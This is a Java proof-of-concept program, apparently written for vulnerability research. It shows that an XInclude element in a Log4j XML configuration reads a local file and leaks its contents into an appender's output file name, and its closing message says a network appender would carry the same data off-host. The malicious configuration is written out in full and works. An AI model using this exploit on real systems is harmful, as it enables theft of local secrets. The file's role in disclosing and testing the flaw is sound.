// Deliberately NOT in an org.apache.logging.log4j.* package: unlike
// XIncludeRealSourceProof (which calls the package-private
// newDocumentBuilder() directly), this proof drives the whole real startup
// path any application uses -- Configurator.initialize() with a real
// ConfigurationSource -- to answer the follow-up question the earlier proof
// left open: is the file read actually blind (content stays inside the
// config DOM, consumed only internally), or can it end up somewhere visible
// outside the process, using nothing but log4j's own documented Properties +
// attribute-substitution mechanism?

import java.io.File;
import java.io.FileWriter;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.stream.Stream;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.core.LoggerContext;
import org.apache.logging.log4j.core.config.ConfigurationSource;
import org.apache.logging.log4j.core.config.Configurator;

public class XIncludeExfilProof {

    private static int failed = 0;
    private static final String CANARY = "CANARY-xinclude-exfil-9b2e-do-not-leak";

    public static void main(String[] args) throws Exception {
        System.out.println("=== XInclude: does the read stay blind, or does it surface outside the process? ===\n");

        File secret = File.createTempFile("xinclude-exfil-secret", ".txt");
        secret.deleteOnExit();
        try (FileWriter w = new FileWriter(secret)) {
            w.write(CANARY);
        }

        Path exfilDir = Files.createTempDirectory("xinclude-exfil-out");
        exfilDir.toFile().deleteOnExit();

        // A config an attacker with config-write access would author: read a
        // local file via <xi:include> into a Property, then reference that
        // property (${leak}) in a FileAppender's fileName attribute -- an
        // ordinary, documented use of Log4j's own Properties + attribute
        // substitution, not a second bug. No custom plugin needed: FileAppender
        // is a real, already plugin-discovered appender in this build.
        String xml = "<?xml version=\"1.0\"?>\n"
                + "<Configuration xmlns:xi=\"http://www.w3.org/2001/XInclude\" status=\"error\">\n"
                + "  <Properties>\n"
                + "    <Property name=\"leak\"><xi:include href=\"file://" + secret.getAbsolutePath()
                + "\" parse=\"text\"/></Property>\n"
                + "  </Properties>\n"
                + "  <Appenders>\n"
                + "    <File name=\"Exfil\" fileName=\"" + exfilDir.toAbsolutePath() + "/marker-${leak}.out\">\n"
                + "      <PatternLayout pattern=\"%msg%n\"/>\n"
                + "    </File>\n"
                + "  </Appenders>\n"
                + "  <Loggers>\n"
                + "    <Root level=\"INFO\">\n"
                + "      <AppenderRef ref=\"Exfil\"/>\n"
                + "    </Root>\n"
                + "  </Loggers>\n"
                + "</Configuration>\n";

        ConfigurationSource source =
                new ConfigurationSource(new java.io.ByteArrayInputStream(xml.getBytes("UTF-8")));

        LoggerContext ctx = Configurator.initialize(XIncludeExfilProof.class.getClassLoader(), source);
        try {
            Logger logger = ctx.getLogger(XIncludeExfilProof.class);
            logger.info("trigger");
        } finally {
            Configurator.shutdown(ctx);
        }

        checkExfilDirForLeakedFileName(exfilDir);

        System.out.println();
        if (failed > 0) {
            System.out.println(failed + " check(s) FAILED");
            System.exit(1);
        }
        System.out.println("All checks passed.");
        System.out.println("\nThe leaked file's contents did not stay inside the parser's DOM: they came\n"
                + "back out as part of a real, attacker-visible filesystem artifact (here, an\n"
                + "output file's NAME), produced entirely through Log4j's own documented\n"
                + "Properties + attribute-substitution mechanism -- no second bug, no custom\n"
                + "plugin, just <Properties> feeding a real Appender attribute the same way an\n"
                + "operator would use ${sys:...} or ${env:...} in a normal config. A network\n"
                + "appender (Socket/Syslog/Http) pointed at attacker infrastructure instead of\n"
                + "a local File appender would exfiltrate it off-host the same way, still with\n"
                + "no additional vulnerability required -- this proof stops at the local\n"
                + "filesystem because that's what this sandbox can observe without outbound\n"
                + "network access.");
    }

    private static void checkExfilDirForLeakedFileName(Path exfilDir) throws Exception {
        boolean found;
        String matchedName = null;
        try (Stream<Path> entries = Files.list(exfilDir)) {
            for (Path p : (Iterable<Path>) entries::iterator) {
                if (p.getFileName().toString().contains(CANARY)) {
                    matchedName = p.getFileName().toString();
                    break;
                }
            }
        }
        found = matchedName != null;
        assertTrue(
                "the secret file's contents (not just a reference to it) appear in the "
                        + "OUTPUT FILE'S NAME on disk"
                        + (found ? ": \"" + matchedName + "\"" : " (not found -- read stayed blind)"),
                found);
    }

    private static void assertTrue(String what, boolean ok) {
        if (ok) {
            System.out.println("  [PASS] " + what);
        } else {
            failed++;
            System.out.println("  [FAIL] " + what);
        }
    }
}
